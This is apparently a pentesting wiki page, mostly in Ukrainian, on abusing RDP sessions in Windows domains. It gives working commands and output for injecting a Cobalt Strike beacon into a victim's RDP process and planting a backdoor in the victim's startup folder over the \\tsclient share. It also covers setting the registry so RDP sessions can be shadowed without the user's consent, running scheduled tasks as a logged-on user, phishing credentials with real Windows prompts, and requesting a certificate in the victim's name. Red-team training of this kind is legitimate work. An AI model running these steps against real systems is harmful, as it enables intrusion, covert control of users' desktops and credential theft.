# Зловживання RDP сесіями

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Якщо **зовнішня група** має **RDP access** до будь-якого **комп'ютера** в поточному домені, **attacker** може **компрометувати цей комп'ютер і чекати на користувача**.

Коли цей користувач підключиться через RDP, **attacker може pivot у сесію цього користувача** і зловживати його дозволами у зовнішньому домені.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Перегляньте **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Якщо користувач підключається через **RDP into a machine**, де **attacker** його **waiting**, цей attacker зможе **inject a beacon in the RDP session of the user**, а якщо **victim mounted his drive** під час доступу через RDP, то **attacker could access it**.

У цьому випадку ви можете просто **compromise** **victims** **original computer**, записавши **backdoor** у **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Якщо ви є **local admin** на хості, де жертва вже має **active RDP session**, ви можете мати можливість **переглядати/керувати цим робочим столом без викрадення пароля або дампу LSASS**.

Це залежить від політики **Remote Desktop Services shadowing**, що зберігається в:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
- `0`: Вимкнено
- `1`: `EnableInputNotify` (керування, потрібне підтвердження користувача)
- `2`: `EnableInputNoNotify` (керування, **без підтвердження користувача**)
- `3`: `EnableNoInputNotify` (лише перегляд, потрібне підтвердження користувача)
- `4`: `EnableNoInputNoNotify` (лише перегляд, **без підтвердження користувача**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Це особливо корисно, коли привілейований користувач, підключений через RDP, залишив розблокований робочий стіл, сеанс KeePass, консоль MMC, сесію браузера або відкритий admin shell.

## Scheduled Tasks від імені увійденого користувача

Якщо ви є **local admin** і цільовий користувач **currently logged on**, Task Scheduler може запустити код **as that user without their password**.

Це перетворює існуючу сесію входу жертви на execution primitive:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notes:

- Якщо користувач **не ввійшов у систему**, Windows зазвичай вимагає пароль для створення завдання, яке виконуватиметься від його імені.
- Якщо користувач **увійшов у систему**, завдання може повторно використовувати існуючий контекст входу.
- Це практичний спосіб виконати GUI-дії або запустити бінарні файли всередині сеансу жертви без звернення до LSASS.

## CredUI Prompt Abuse From the Victim Session

Якщо ви можете виконувати команди **всередині інтерактивного робочого столу жертви** (наприклад через **Shadow RDP** або **заплановане завдання, що виконується від імені цього користувача**), ви можете відобразити **реальне вікно запиту облікових даних Windows** за допомогою CredUI API та зібрати облікові дані, введені жертвою.

Відповідні API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Типовий сценарій:

1. Spawn a binary in the victim session.
2. Display a domain-authentication prompt that matches the current domain branding.
3. Unpack the returned auth buffer.
4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.

Це корисно для **on-host phishing**, оскільки підказка відображається стандартними Windows API замість фальшивої HTML-форми.

## Requesting a PFX In the Victim Context

Та сама примітива **scheduled-task-as-user** може використовуватися для запиту **сертифіката/PFX від імені увійшовшого користувача**. Цей сертифікат може пізніше використовуватися для **AD authentication** від імені цього користувача, повністю уникаючи викрадення пароля.

Загальна послідовність:

1. Gain **local admin** on a host where the victim is logged on.
2. Run enrollment/export logic as the victim using a **заплановане завдання**.
3. Export the resulting **PFX**.
4. Use the PFX for PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
